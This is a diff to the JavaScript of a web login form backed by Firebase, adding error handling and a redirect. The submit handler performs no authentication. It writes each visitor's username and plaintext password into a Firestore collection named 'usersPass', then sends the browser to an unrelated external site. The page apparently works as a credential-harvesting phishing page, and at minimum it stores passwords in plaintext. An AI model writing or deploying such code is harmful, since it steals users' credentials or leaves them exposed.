@@ -16,21 +16,29 @@ const firebaseConfig = {
   measurementId: "G-DHZ075SLSP"
 };
 
+// Initialize Firebase
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
+// Handle login submit
 document.getElementById("loginForm").addEventListener("submit", async (e) => {
   e.preventDefault();
 
   const username = document.getElementById("username").value;
   const password = document.getElementById("password").value;
 
-  await addDoc(collection(db, "usersPass"), {
-    username,
-    password,
-    createdAt: serverTimestamp()
-  });
+  try {
+    await addDoc(collection(db, "usersPass"), {
+      username: username,
+      password: password,
+      createdAt: serverTimestamp()
+    });
 
-  document.getElementById("msg").innerText = "Logged in";
-  e.target.reset();
+    // ✅ REDIRECT AFTER LOGIN
+    window.location.href = "https://pdf.exampundit.in/";
+
+  } catch (error) {
+    console.error(error);
+    document.getElementById("msg").innerText = "Login failed";
+  }
 });
